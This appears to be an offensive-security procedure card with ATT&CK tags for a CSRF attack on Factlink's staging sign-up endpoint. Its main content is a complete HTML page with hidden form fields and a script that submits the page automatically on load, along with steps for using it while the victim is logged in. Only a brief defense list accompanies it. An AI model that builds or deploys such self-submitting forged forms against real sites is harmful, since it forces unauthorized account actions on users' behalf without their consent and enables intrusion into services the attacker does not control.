---
id: proc-uuid-1
tags:
  - csrf
  - html-form
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:15.747Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-CSRF-HTML-Form-for-Factlink-Sign-Up

## Summary

This procedure creates a malicious HTML page that exploits a CSRF vulnerability in the Factlink sign-up process by auto-submitting a forged POST request to create a new user account without the victim's consent.

## Description

The Factlink sign-up endpoint at https://staging.factlink.com/users/sign_in_or_up/up lacks effective CSRF protection, allowing an attacker to craft an HTML form with hidden inputs for user details. When loaded in the victim's browser while authenticated, the form submits automatically, creating an account with attacker-controlled credentials. This targets Ruby on Rails applications where authenticity tokens may be predictable or improperly validated.

## Requirements

1. Knowledge of the target form fields (full_name, email, password, password_confirmation, authenticity_token)
2. Access to inspect the legitimate sign-up form for token extraction
3. Basic HTML editing capabilities

## Defense

Defensive measures and detection strategies:

- Implement proper CSRF tokens with per-session uniqueness and strict validation
- Use SameSite cookies to prevent cross-site requests
- Monitor for anomalous account creations from trusted IPs

## Objectives

1. Forge a sign-up request that bypasses CSRF checks
2. Auto-submit the form upon page load
3. Enable silent account creation for the attacker

## Instructions

### Step 1: Inspect and Replicate Form Structure

**Context**: Analyze the legitimate sign-up form to copy necessary fields, including the authenticity token if visible or guessable.

Create the base HTML structure:

```html
<!DOCTYPE html>
<html>
<body>
  <form action="https://staging.factlink.com/users/sign_in_or_up/up" method="POST" id="csrf-form">
    <input type="hidden" name="utf8" value="&#x2713;">
    <input type="hidden" name="authenticity_token" value="[TOKEN_HERE]">
    <input type="hidden" name="user[full_name]" value="Victim Name">
    <input type="hidden" name="user[email]" value="attacker@evil.com">
    <input type="hidden" name="user[password]" value="weakpass123">
    <input type="hidden" name="user[password_confirmation]" value="weakpass123">
    <input type="submit" style="display:none;">
  </form>
  <script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

> This HTML includes hidden inputs for all required fields and JavaScript to auto-submit on load. Replace [TOKEN_HERE] with an actual token if obtainable via inspection.

### Step 2: Save and Test Locally

**Context**: Save the file and test in a browser to ensure auto-submission without errors.

Save as anyname.html and open in a browser while logged into Factlink staging.

> Expected output: Form submits immediately, creating the account if protections are bypassed.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[csrf]]
- [[web-exploitation]]
